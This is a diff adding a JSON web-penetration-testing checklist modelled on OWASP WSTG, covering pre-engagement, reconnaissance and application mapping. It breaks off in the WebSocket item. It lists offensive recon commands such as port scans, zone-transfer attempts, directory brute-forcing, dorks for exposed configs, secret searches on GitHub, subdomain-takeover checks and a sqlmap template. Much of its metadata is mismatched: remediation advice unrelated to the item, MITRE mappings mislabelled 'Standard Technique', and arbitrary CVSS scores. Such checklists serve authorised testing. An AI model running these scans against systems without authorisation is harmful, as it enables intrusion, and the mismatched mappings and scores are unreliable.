@@ -1,0 +1,3722 @@
+{
+  "id": "web-owasp-wstg",
+  "name": "Web Application Penetration Testing (OWASP WSTG v4.2)",
+  "description": "Industry standard web application security testing framework covering 13 phases (OWASP Top 10, WSTG v4.2, CWE, and MITRE ATT&CK Enterprise).",
+  "category": "Web",
+  "icon": "\ud83c\udf10",
+  "version": "4.2",
+  "is_builtin": true,
+  "phases": [
+    {
+      "id": "P0",
+      "name": "Pre-Engagement",
+      "scope": "project",
+      "items": [
+        {
+          "id": "PRE-01",
+          "name": "Define Scope & Rules of Engagement",
+          "sev": "info",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Document all in-scope URLs, IP ranges, domains, excluded paths, and test window in a written agreement signed by all parties before any testing begins.",
+          "cases": [
+            "List every in-scope host, URL path, and IP range",
+            "Explicitly list excluded paths: /payment-gateway, live-db, DR systems",
+            "Define testing window: start/end datetime with timezone",
+            "Define emergency stop procedure and escalation contacts",
+            "Document what constitutes out-of-scope (third-party integrations, CDN endpoints)",
+            "Get written authorization signed by asset owner"
+          ],
+          "expected": "Signed scope document with no ambiguity. Out-of-scope paths clearly listed. Written authorization obtained.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Written agreement / contract",
+            "Scope template"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "PRE-02",
+          "name": "Confirm Testing Window & Emergency Contacts",
+          "sev": "info",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Agree on date/time restrictions, blackout periods, and emergency contacts. Document rollback procedures.",
+          "cases": [
+            "Define off-peak testing hours if production environment",
+            "Establish rollback/stop procedure in case of unintended impact",
+            "Identify emergency contacts on client side (name, phone, email)",
+            "Document acceptable source IP addresses for testing",
+            "Confirm whether DoS-style tests (rate limiting, race conditions) are permitted"
+          ],
+          "expected": "Testing schedule agreed. Emergency stop procedure documented. Contact list in place. Source IPs whitelisted.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Email",
+            "Calendar",
+            "Written agreement"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "PRE-03",
+          "name": "Document Target Tech Stack",
+          "sev": "info",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Identify ASP.NET version, .NET CLR, IIS version, SQL Server, frontend frameworks, CDN, WAF prior to active testing.",
+          "cases": [
+            "Check response headers for X-AspNet-Version, X-Powered-By in any response",
+            "Run: whatweb https://target.com",
+            "Use Wappalyzer browser extension while browsing the target",
+            "Note: .NET version, IIS version, JavaScript frameworks, database indicators",
+            "Identify WAF/CDN: Cloudflare, Akamai, AWS CloudFront (affects testing approach)",
+            "Note API style: REST, GraphQL, OData, SOAP/WSDL"
+          ],
+          "expected": "Tech stack inventory completed: OS, web server+version, framework+version, database, CDN, WAF. Payloads can now be targeted.",
+          "recommendation": "Use parameterized queries (PreparedStatements / ORMs) for all database access. Never concatenate user input directly into SQL strings. Enforce database user least privilege.",
+          "tools": [
+            "Wappalyzer",
+            "BuiltWith",
+            "whatweb",
+            "Burp response headers",
+            "nmap -sV"
+          ],
+          "command_template": "sqlmap -u \"{{URL}}\" --batch --random-agent --banner",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "PRE-04",
+          "name": "Configure Burp Suite & OWASP ZAP",
+          "sev": "info",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Set up both Burp Suite and ZAP as proxies. Install CA certificates. Configure target scope.",
+          "cases": [
+            "Burp: Proxy \u2192 Listeners \u2192 127.0.0.1:8080 | Import Burp CA cert into Firefox",
+            "ZAP: Listen on 127.0.0.1:8081 | Import ZAP root CA",
+            "Set Burp target scope to target domain to filter noise",
+            "Enable Burp passive scan in background while browsing",
+            "ZAP: Configure Ajax Spider for React/Angular/Vue SPAs",
+            "Test intercept: visit https://target.com \u2192 confirm request captured in both tools"
+          ],
+          "expected": "All browser HTTPS traffic intercepted without SSL errors. Passive scan running in background.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "Burp Suite Community Edition",
+            "OWASP ZAP",
+            "Firefox"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "PRE-05",
+          "name": "Create Project Folder Structure & Test Accounts",
+          "sev": "info",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "0.0 (Informational)",
+          "how": "Set up organised directories for evidence. Obtain or create test accounts for each role type.",
+          "cases": [
+            "mkdir -p project/{recon,scans,screenshots,findings,reports}",
+            "Document all tool versions used in a README.txt",
+            "Obtain: unauthenticated access (no account needed)",
+            "Obtain: low-privilege user account (test1@target.com)",
+            "Obtain: admin/privileged account (if in scope)",
+            "Obtain: API keys/tokens for API testing",
+            "Confirm test accounts are isolated from real user data"
+          ],
+          "expected": "Folder structure in place. Test accounts for each role available and documented securely.",
+          "recommendation": "Establish clear governance, written rules of engagement, and systematic remediation tracking with SLA timelines based on finding severity.",
+          "tools": [
+            "bash",
+            "Password manager"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P1",
+      "name": "Reconnaissance",
+      "scope": "project",
+      "items": [
+        {
+          "id": "WSTG-INFO-01",
+          "name": "Search Engine Discovery (Google Dorking)",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Use advanced search operators to find exposed files, login pages, error messages, and config files indexed by search engines.",
+          "cases": [
+            "site:target.com filetype:pdf \u2014 exposed documents",
+            "site:target.com inurl:admin OR inurl:administrator \u2014 admin pages",
+            "site:target.com \"error\" OR \"exception\" OR \"stack trace\" \u2014 verbose errors",
+            "site:target.com ext:config OR ext:bak OR ext:sql OR ext:old \u2014 config/backups",
+            "site:target.com inurl:api OR inurl:swagger OR inurl:api-docs \u2014 API endpoints",
+            "intext:\"target.com\" filetype:xls OR filetype:xlsx \u2014 data exports",
+            "site:target.com inurl:login OR inurl:signin \u2014 login pages",
+            "intitle:\"index of\" site:target.com \u2014 directory listings"
+          ],
+          "expected": "No sensitive files, admin interfaces, credentials, or verbose errors indexed by search engines.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Google",
+            "Bing",
+            "ghdb.exploit-db.com",
+            "DorkSearch.com"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INFO-02",
+          "name": "Fingerprint Web Server",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Analyze HTTP response headers, error pages, and timing to identify web server software and version.",
+          "cases": [
+            "Send GET / via Burp Repeater \u2192 inspect all response headers",
+            "Look for: Server: Microsoft-IIS/10.0 (version disclosure)",
+            "Look for: X-Powered-By: ASP.NET, X-AspNet-Version: 4.0.30319",
+            "Trigger 404 \u2192 check default error page format (IIS vs nginx vs Apache)",
+            "Send invalid HTTP verb \u2192 check error response format",
+            "ETag header format differs between web servers",
+            "nmap -sV -p 443 target.com \u2014 OS/service fingerprint"
+          ],
+          "expected": "Server headers must NOT reveal version numbers. X-AspNet-Version and X-Powered-By absent from all responses.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "Burp Suite Repeater",
+            "curl -I https://target.com",
+            "Wappalyzer",
+            "nmap -sV"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INFO-03",
+          "name": "Review Webserver Metafiles",
+          "sev": "low",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "3.8 (Low)",
+          "how": "Request robots.txt, sitemap.xml, and .well-known resources to enumerate paths and application structure.",
+          "cases": [
+            "GET /robots.txt \u2014 note ALL Disallow entries (potential high-value targets)",
+            "GET /sitemap.xml \u2014 enumerate all mapped URLs",
+            "GET /sitemap_index.xml \u2014 index of multiple sitemaps",
+            "GET /.well-known/security.txt \u2014 contact info and policy disclosure",
+            "GET /.well-known/openid-configuration \u2014 OIDC endpoint discovery",
+            "GET /crossdomain.xml \u2014 Flash cross-domain policy",
+            "GET /clientaccesspolicy.xml \u2014 Silverlight policy"
+          ],
+          "expected": "robots.txt does not reveal sensitive internal paths. Sitemap covers only public content.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Browser",
+            "Burp Repeater",
+            "curl"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INFO-04",
+          "name": "Enumerate Applications on Webserver",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Discover all web applications on the same server using port scanning, virtual hosting, and subdomain enumeration.",
+          "cases": [
+            "nmap -sV -p 80,443,8080,8443,8000,8888,9090,3000,4443 target.com",
+            "Test virtual host routing: modify Host header to known subdomains",
+            "Test: dev., staging., test., uat., api., admin., portal. subdomains",
+            "gobuster vhost -u https://target.com -w subdomains.txt",
+            "Check for apps on non-standard ports",
+            "Test HTTP/2 vs HTTP/1.1 responses for differences"
+          ],
+          "expected": "All applications on server catalogued. Unexpected apps on non-standard ports is a finding.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "nmap",
+            "gobuster vhost",
+            "ffuf -H \"Host: FUZZ.target.com\""
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INFO-05",
+          "name": "Webpage Content Information Leakage",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Review HTML source, JavaScript files, and comments for credentials, API keys, internal paths, and developer notes.",
+          "cases": [
+            "View-source on EVERY page: Ctrl+U \u2192 search: password, apikey, secret, token, TODO, FIXME, debug, internal",
+            "Open DevTools \u2192 Sources \u2192 review ALL .js files for hardcoded secrets",
+            "Search .js: Authorization, Bearer, Basic, api_key, private_key, connectionString, AWS_ACCESS",
+            "Check HTML meta tags for: generator, internal URLs, build IDs",
+            "Check for email addresses in source (staff enumeration for phishing awareness)",
+            "Check data- HTML attributes for sensitive values",
+            "Search for internal domains: .internal, .corp, .local, 192.168., 10.0."
+          ],
+          "expected": "No credentials, API keys, tokens, or sensitive internal information in client-side code.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Browser DevTools",
+            "Burp \u2192 filter .js",
+            "LinkFinder",
+            "grep / ripgrep"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-01",
+          "name": "WHOIS, DNS & Passive Reconnaissance",
+          "sev": "low",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [],
+          "cvss_score": "3.8 (Low)",
+          "how": "Run WHOIS and DNS enumeration to find org contacts, subdomains, and attempt zone transfer. Search Shodan/Censys/Wayback.",
+          "cases": [
+            "whois target.com \u2014 registrar, org, email contacts",
+            "dig target.com ANY \u2014 all DNS records",
+            "dig axfr @ns1.target.com target.com \u2014 zone transfer (should return REFUSED)",
+            "dnsenum target.com \u2014 automated DNS enum",
+            "crt.sh: https://crt.sh/?q=%.target.com \u2014 subdomain discovery via cert transparency",
+            "Shodan.io: search target IP \u2014 open ports, banners, SSL certs",
+            "archive.org/web \u2014 old pages, removed endpoints, legacy parameters",
+            "LinkedIn / job postings \u2014 tech stack, internal tool names",
+            "Hunter.io \u2014 employee email patterns for phishing awareness"
+          ],
+          "expected": "Zone transfer disabled. No internal hostnames disclosed via DNS. SPF/DKIM/DMARC properly configured.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "whois",
+            "dig",
+            "dnsenum",
+            "crt.sh",
+            "shodan.io",
+            "archive.org"
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-02",
+          "name": "Port Scanning & Service Detection",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "TA0043 - Standard Technique"
+          ],
+          "mitre": [
+            "TA0043"
+          ],
+          "cwe": [
+            "CWE-668"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Run full TCP port scan with service and version detection to discover all open services.",
+          "cases": [
+            "nmap -sV -sC -p- --open target.com -oA scan_output (full scan)",
+            "nmap -sV -p 80,443,8080,8443,8000,9090,3389,22,21,25,3306,1433,5432 target.com (quick)",
+            "Check for management ports: 3389 (RDP), 22 (SSH), 8080/8443 (admin), 21 (FTP)",
+            "masscan -p1-65535 target.com --rate=1000 (fast large-range)",
+            "Identify plaintext services: FTP, Telnet, HTTP (not HTTPS), SMTP without STARTTLS",
+            "Banner grab: nc -v target.com PORT"
+          ],
+          "expected": "Only necessary ports open externally. Management ports restricted to VPN/internal only. No plaintext services.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "nmap",
+            "masscan",
+            "Shodan"
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-03",
+          "name": "Directory & File Brute-Force",
+          "sev": "high",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-538"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Use wordlists to discover hidden directories, backup files, admin pages, and .NET-specific sensitive paths.",
+          "cases": [
+            "gobuster dir -u https://target.com -w directory-list-2.3-medium.txt -x aspx,ashx,asmx,config,bak,old,log,txt,json",
+            "Look for: /admin, /administrator, /manage, /backup, /api, /.git, /web.config, /appsettings.json",
+            ".NET specific: /App_Data/, /App_Code/, /elmah.axd, /trace.axd, /ScriptResource.axd, /WebResource.axd",
+            "Try: web.config.bak, appsettings.json.old, web.config~, appsettings.Development.json",
+            "ffuf -w wordlist.txt -u https://target/FUZZ -mc 200,301,302,403",
+            "feroxbuster -u https://target.com -x aspx,ashx --depth 3",
+            "Check response 403 pages \u2014 they confirm existence even if access denied"
+          ],
+          "expected": "No backup files, git repos, admin interfaces, or sensitive config files web-accessible.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "gobuster",
+            "feroxbuster",
+            "ffuf",
+            "OWASP ZAP Forced Browse"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-04",
+          "name": "GitHub / Source Code Leakage",
+          "sev": "critical",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Search GitHub, GitLab, and other repositories for leaked credentials, API keys, config files.",
+          "cases": [
+            "GitHub: org:companyname password OR secret OR api_key OR apikey",
+            "GitHub: filename:.env target.com",
+            "GitHub: filename:web.config connectionstring",
+            "GitHub: filename:appsettings.json company OR target",
+            "GitLeaks: gitleaks detect on any found repos",
+            "truffleHog on repositories: trufflehog git https://github.com/target/repo",
+            "Search: \"target.com\" in:file language:yaml (CI/CD config secrets)",
+            "Search: \"smtp.target.com\" OR \"db.target.com\" in GitHub code"
+          ],
+          "expected": "No credentials, API keys, connection strings, or internal config leaked in public repositories.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "GitHub advanced search",
+            "gitleaks",
+            "truffleHog",
+            "gitrob"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-05",
+          "name": "Subdomain Takeover",
+          "sev": "high",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [
+            "CWE-284"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Check DNS CNAME records for entries pointing to unclaimed cloud services (Azure, AWS, GitHub Pages, Heroku).",
+          "cases": [
+            "subfinder -d target.com -o subs.txt \u2014 enumerate subdomains",
+            "amass enum -d target.com \u2014 comprehensive subdomain enum",
+            "For each subdomain: dig CNAME sub.target.com \u2014 what does it point to?",
+            "Look for: NXDOMAIN responses on CNAME targets = potential takeover",
+            "Check unclaimed Azure: .azurewebsites.net | GitHub: .github.io | Heroku: .herokuapp.com",
+            "subjack -w subs.txt -t 100 -timeout 30 -o results.txt",
+            "can-i-take-over-xyz for automated fingerprinting"
+          ],
+          "expected": "All subdomains resolve to active owned resources. No dangling DNS CNAME entries pointing to unclaimed services.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "subfinder",
+            "amass",
+            "subjack",
+            "dig",
+            "can-i-take-over-xyz"
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "INFO-06",
+          "name": "Parameter Discovery",
+          "sev": "medium",
+          "mitre_tactic": "Reconnaissance",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Reconnaissance"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Discover hidden or undocumented GET/POST parameters on known endpoints.",
+          "cases": [
+            "arjun -u https://target.com/page --get \u2014 discover hidden GET params",
+            "arjun -u https://target.com/api/endpoint --post \u2014 POST params",
+            "Burp Param Miner: right-click request \u2192 Guess params (Community: manual)",
+            "Test common hidden params: debug, test, admin, id, user, token, redirect, returnUrl, callback",
+            "Test .NET-specific: __VIEWSTATE, __EVENTVALIDATION, __RequestVerificationToken, __EVENTTARGET",
+            "Try adding: ?_method=DELETE, ?format=json, ?callback=test (JSONP)"
+          ],
+          "expected": "All parameters documented. No hidden debug/admin parameters in production.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "arjun",
+            "Burp Param Miner",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P2",
+      "name": "App Mapping",
+      "scope": "project",
+      "items": [
+        {
+          "id": "MAP-01",
+          "name": "Spider / Crawl Application",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Crawl the entire application using Burp and ZAP. Use Ajax Spider for JS-heavy SPAs. Browse as all user roles.",
+          "cases": [
+            "Burp: right-click host \u2192 Spider this host / Discover Content",
+            "ZAP \u2192 Analyse \u2192 Spider (traditional) | Ajax Spider (React/Angular/Vue SPA)",
+            "Browse as: unauthenticated, low-privilege user, admin (capture all role-specific functionality)",
+            "Map all multi-step flows: registration, checkout, password reset, MFA enrollment",
+            "DevTools Network tab: catch requests not proxied through Burp",
+            "Document: all forms, their method (GET/POST) and action URLs"
+          ],
+          "expected": "Complete sitemap in Burp. All forms, API endpoints, and entry points catalogued by role.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "OWASP ZAP",
+            "Browser DevTools"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "MAP-02",
+          "name": "Map All Entry Points",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Systematically identify every location where user-controlled input enters the application.",
+          "cases": [
+            "GET/POST URL parameters: ?id=1, ?search=test",
+            "URL path segments (REST): /api/users/{id}/profile",
+            "HTTP headers: Cookie, Referer, User-Agent, X-Forwarded-For, X-Forwarded-Host, custom headers",
+            "JSON/XML body parameters",
+            "File upload endpoints (filename, content, metadata)",
+            "WebSocket messages (if present)",
+            "Hidden HTML form fields",
+            "GraphQL query parameters, mutation inputs, variables"
+          ],
+          "expected": "Complete entry point inventory. Every entry point is a potential injection or access control vector.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite Site Map",
+            "OWASP ZAP Spider"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "MAP-03",
+          "name": "JavaScript File Analysis",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1552 - Standard Technique"
+          ],
+          "mitre": [
+            "T1552"
+          ],
+          "cwe": [
+            "CWE-200"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Review all JavaScript files for hardcoded credentials, hidden API endpoints, internal paths, and sensitive logic.",
+          "cases": [
+            "Burp \u2192 Target \u2192 Site Map \u2192 filter .js files \u2192 review each file",
+            "LinkFinder: python linkfinder.py -i https://target.com/app.js -o cli",
+            "Search JS for: apiKey, api_key, password, secret, Bearer, Authorization, /api/, connectionString",
+            "Check for .js.map source maps \u2014 may expose original pre-compiled TypeScript/source",
+            "Check React/Vue/Angular bundles: credentials in .env not excluded from build?",
+            "Search for hardcoded internal URLs: .internal, .corp, 192.168., 10.0.",
+            "Check localStorage.setItem() calls for sensitive token storage"
+          ],
+          "expected": "No credentials or API keys in JavaScript. No hidden admin API endpoints client-side. No source map exposure.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Browser DevTools Sources",
+            "Burp filter .js",
+            "LinkFinder"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "MAP-04",
+          "name": "ViewState Analysis (ASP.NET WebForms)",
+          "sev": "high",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-642"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Check ViewState presence, MAC protection, and sensitive data disclosure.",
+          "cases": [
+            "Find __VIEWSTATE hidden field in page HTML source",
+            "Burp Decoder \u2192 Base64 decode __VIEWSTATE value \u2192 inspect content",
+            "Check if sensitive user data appears in decoded ViewState",
+            "Tamper a byte in ViewState \u2192 resubmit \u2192 should cause MAC error (good = protected)",
+            "Silent acceptance of tampered ViewState = MAC disabled = critical finding",
+            "Check web.config for: enableViewStateMac=\"false\" or viewStateEncryptionMode",
+            "Also check: __EVENTVALIDATION field \u2014 should also be MAC protected"
+          ],
+          "expected": "ViewState MAC-protected. Tampering causes validation error. No sensitive data in plaintext ViewState.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Decoder",
+            "ViewStateDecoder online",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "MAP-05",
+          "name": "API Endpoint Discovery",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Discover API documentation, all endpoints, versioning, and authentication requirements.",
+          "cases": [
+            "Browse to: /swagger, /swagger/index.html, /swagger/ui/index, /api-docs, /openapi.json, /v2/api-docs",
+            "Check JS files for /api/ endpoint references",
+            "Test API versions: /api/v1/ vs /api/v2/ vs /api/v3/ (older versions may have weaker auth)",
+            "Check .NET OData: /api/$metadata (exposes full data schema)",
+            "OPTIONS request on /api/ routes \u2014 lists allowed methods and CORS headers",
+            "GraphQL: /graphql, /api/graphql, /v1/graphql"
+          ],
+          "expected": "API documentation not publicly accessible in production. All API endpoints require authentication. Old versions deprecated.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Browser",
+            "gobuster",
+            "Burp",
+            "Postman"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"Content-Type: application/json\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "MAP-06",
+          "name": "WebSocket Discovery & Analysis",
+          "sev": "medium",
+          "mitre_tactic": "Discovery",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Discovery"
+          ],
+          "cwe": [
+            "CWE-287"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Identify and analyze WebSocket connections for auth, authorization, and injection issues.",
+          "cases": [
+            "Browser DevTools \u2192 Network \u2192 WS tab \u2192 capture all WebSocket messages",
+            "Burp \u2192 WebSockets history \u2192 review all message frames",
+            "Does WebSocket connection include auth token in upgrade request? (Sec-WebSocket-Protocol?)",
+            "Test: modify WebSocket upgrade request \u2192 access other users data?",
